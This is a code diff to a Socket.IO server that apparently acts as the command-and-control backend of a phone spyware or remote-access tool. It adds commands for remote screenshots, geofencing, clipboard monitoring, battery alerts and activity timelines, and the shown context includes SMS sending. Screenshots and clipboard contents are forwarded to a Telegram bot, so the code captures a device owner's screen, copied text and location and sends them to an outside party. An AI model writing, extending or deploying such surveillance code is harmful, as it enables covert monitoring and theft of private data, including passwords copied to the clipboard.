@@ -637,6 +637,127 @@ io.on('connection', (socket) => {
     socket.broadcast.emit('vibrate:done', { deviceId: socket.deviceId, ...data });
   });
 
+  // ---- Screenshot ----
+  socket.on('command:screenshot', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:screenshot');
+    }
+  });
+  socket.on('screenshot:data', (data) => {
+    socket.broadcast.emit('screenshot:data', { deviceId: socket.deviceId, ...data });
+    if (data.image) {
+      sendToTelegram(() => telegram.sendPhoto(data.image, '🖥️ Screenshot'));
+    }
+  });
+
+  // ---- Geofence ----
+  socket.on('command:geofence:set', ({ deviceId, lat, lng, radius, name }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:geofence:set', { lat, lng, radius, name });
+    }
+  });
+  socket.on('command:geofence:clear', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:geofence:clear');
+    }
+  });
+  socket.on('geofence:alert', (data) => {
+    socket.broadcast.emit('geofence:alert', { deviceId: socket.deviceId, ...data });
+    const icon = data.type === 'exit' ? '🚨' : '📍';
+    sendToTelegram(() => telegram.sendMessage(
+      `${icon} <b>Geofence ${data.type === 'exit' ? 'EXIT' : 'ENTER'} Alert</b>\n` +
+      `━━━━━━━━━━━━━━━━━━\n` +
+      `📍 Zone: ${data.name || 'Unnamed'}\n` +
+      `📐 Distance: ${Math.round(data.distance)}m from center\n` +
+      `⏰ ${new Date().toLocaleString()}`
+    ));
+  });
+  socket.on('geofence:status', (data) => {
+    socket.broadcast.emit('geofence:status', { deviceId: socket.deviceId, ...data });
+  });
+
+  // ---- Battery Alerts ----
+  socket.on('command:batteryalert:set', ({ deviceId, threshold }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:batteryalert:set', { threshold });
+    }
+  });
+  socket.on('command:batteryalert:clear', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:batteryalert:clear');
+    }
+  });
+  socket.on('battery:alert', (data) => {
+    socket.broadcast.emit('battery:alert', { deviceId: socket.deviceId, ...data });
+    sendToTelegram(() => telegram.sendMessage(
+      `🔋 <b>Battery Alert!</b>\n━━━━━━━━━━━━━━━━━━\n` +
+      `⚡ Level: ${data.level}%\n` +
+      `🔌 Charging: ${data.charging ? 'Yes' : 'No'}\n` +
+      `⚠️ Threshold: ${data.threshold}%\n` +
+      `⏰ ${new Date().toLocaleString()}`
+    ));
+  });
+
+  // ---- Activity Timeline ----
+  socket.on('command:timeline:fetch', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:timeline:fetch');
+    }
+  });
+  socket.on('timeline:data', (data) => {
+    socket.broadcast.emit('timeline:data', { deviceId: socket.deviceId, ...data });
+  });
+
+  // ---- Clipboard Monitor ----
+  socket.on('command:clipmonitor:start', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:clipmonitor:start');
+    }
+  });
+  socket.on('command:clipmonitor:stop', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:clipmonitor:stop');
+    }
+  });
+  socket.on('clipboard:change', (data) => {
+    socket.broadcast.emit('clipboard:change', { deviceId: socket.deviceId, ...data });
+    sendToTelegram(() => telegram.sendMessage(
+      `📋 <b>Clipboard Changed</b>\n━━━━━━━━━━━━━━━━━━\n` +
+      `📝 ${(data.text || '').substring(0, 200)}\n` +
+      `⏰ ${new Date().toLocaleString()}`
+    ));
+  });
+
+  // ---- Network Speed Test ----
+  socket.on('command:speedtest', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:speedtest');
+    }
+  });
+  socket.on('speedtest:result', (data) => {
+    socket.broadcast.emit('speedtest:result', { deviceId: socket.deviceId, ...data });
+  });
+
+  // ---- Device Rename ----
+  socket.on('command:device:rename', ({ deviceId, newName }) => {
+    if (devices.has(deviceId)) {
+      const device = devices.get(deviceId);
+      device.name = newName;
+      devices.set(deviceId, device);
+      io.emit('devices:updated');
+      socket.emit('device:renamed', { deviceId, newName, success: true });
+    }
+  });
+
   // Send SMS
   socket.on('command:sms:send', ({ deviceId, number, message }) => {
     const targetSocketId = deviceSockets.get(deviceId);
